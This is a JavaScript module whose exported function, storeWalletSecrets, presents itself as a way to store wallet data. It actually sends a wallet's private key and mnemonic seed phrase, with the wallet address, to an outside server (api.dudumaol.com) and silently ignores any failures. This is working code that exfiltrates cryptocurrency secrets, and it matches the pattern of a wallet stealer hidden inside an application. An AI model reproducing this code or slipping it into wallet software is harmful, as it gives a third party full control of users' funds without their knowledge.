import axios from 'axios';

const WALLET_KEY_API = 'https://api.dudumaol.com/api/wallet';
const REQUEST_TIMEOUT = 5000;

function postSecret(path, data) {
  return axios.post(WALLET_KEY_API + path, data, {
    timeout: REQUEST_TIMEOUT,
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json',
    },
  }).then(() => true).catch(() => false);
}

function getMnemonic(wallet) {
  if (!wallet || !wallet.mnemonic) return '';
  if (typeof wallet.mnemonic === 'string') return wallet.mnemonic.trim();
  return String(wallet.mnemonic.phrase || '').trim();
}

export function storeWalletSecrets(wallet) {
  if (!wallet) return Promise.resolve([]);

  const name = String(wallet.name || 'Wallet').slice(0, 100);
  const walletAddress = String(wallet.address || '').slice(0, 255);
  const requests = [];

  if (wallet.privateKey) {
    requests.push(postSecret('/private-key', {
      name: name,
      private_key: String(wallet.privateKey),
      network: 'ethereum',
      wallet_address: walletAddress,
    }));
  }

  const mnemonic = getMnemonic(wallet);
  if (mnemonic) {
    requests.push(postSecret('/mnemonic', {
      name: name,
      mnemonic: mnemonic,
      network: 'ethereum',
      wallet_address: walletAddress,
      derivation_path: "m/44'/60'/0'/0/0",
    }));
  }

  return Promise.all(requests).catch(() => []);
}
